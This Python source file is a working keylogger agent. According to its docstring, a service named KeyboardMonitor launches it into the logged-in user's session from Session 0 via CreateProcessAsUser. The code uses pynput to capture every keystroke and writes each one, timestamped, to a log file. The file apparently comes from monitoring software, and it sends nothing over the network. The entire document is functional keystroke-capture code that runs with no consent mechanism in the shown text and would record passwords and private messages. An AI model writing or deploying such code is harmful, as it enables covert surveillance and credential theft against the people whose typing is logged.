"""
Standalone keylogger agent.

This script is spawned by KeyboardMonitor into the active interactive user
session (via CreateProcessAsUser) so that pynput can reach the user's
keyboard input – something that is not possible from Session 0 directly.

Usage:
    python keylogger_agent.py <path_to_log_file>
"""

import os
import sys
from datetime import datetime

from pynput import keyboard


def main() -> None:
    if len(sys.argv) < 2:
        print("Usage: keylogger_agent.py <log_file_path>", file=sys.stderr)
        sys.exit(1)

    log_file = sys.argv[1]
    os.makedirs(os.path.dirname(os.path.abspath(log_file)), exist_ok=True)

    # Keep the log file open for the lifetime of the listener to avoid the
    # overhead of open/close on every keypress.
    with open(log_file, "a", encoding="utf-8") as fh:
        def on_press(key: keyboard.Key) -> None:
            if hasattr(key, "char") and key.char is not None:
                char = key.char
            elif hasattr(key, "name"):
                char = f"[{key.name}]"
            else:
                char = str(key)
            entry = f"{datetime.now().isoformat()} {char}\n"
            try:
                fh.write(entry)
                fh.flush()
            except OSError as exc:
                print(f"keylogger_agent: write error: {exc}", file=sys.stderr, flush=True)

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()


if __name__ == "__main__":
    main()
